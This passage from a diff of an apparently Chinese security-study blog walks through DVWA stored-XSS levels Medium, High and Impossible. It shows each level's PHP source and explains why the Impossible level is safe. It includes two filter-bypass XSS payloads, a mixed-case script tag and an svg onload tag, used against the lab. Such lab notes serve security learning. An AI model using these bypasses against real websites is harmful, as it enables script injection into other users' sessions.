class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>strip_tags()：函数功能是让字符串中的html，xml，php标签变成空字符</p>
+</blockquote>
+<p>Medium与Low相比，Medium过滤有些许变化，给Message字符串的特殊字符加反斜杠转义，然后再转义sql特殊字符，然后再转义尖括号<code>&lt;&gt;</code>；对name字符串则只是将<code>&lt;script&gt;</code>字符串过滤掉，大小写或者使用其他标签可绕过，然后过滤sql特殊字符，但是name输入框有最大长度限制，因为限制在前端，所以很好绕过。</p>
+<p>payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="actionscript">alert(<span class="string">"`"</span>)</span><span class="tag">&lt;/<span class="name">ScriPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Stored：High"><a href="#Stored：High" class="headerlink" title="Stored：High"></a>Stored：High</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与之前Medium不同的是对name字符串的过滤不一样了，这次使用正则匹配script字符，不能用大小写绕过了，那就换个标签来即可</p>
+<p>payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Stored：Impossible"><a href="#Stored：Impossible" class="headerlink" title="Stored：Impossible"></a>Stored：Impossible</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用PDO来防止SQL注入</p>
+<p>对name和message采用了同样的方式来防止XSS</p>
+<p>Anti-CSRF token机制有效防止了CSRF</p>
+<hr>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    sql注入基础学习
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/index/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">Index</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            kn0sky &copy; 2020 
+            <a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="external nofollow noopener noreferrer">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
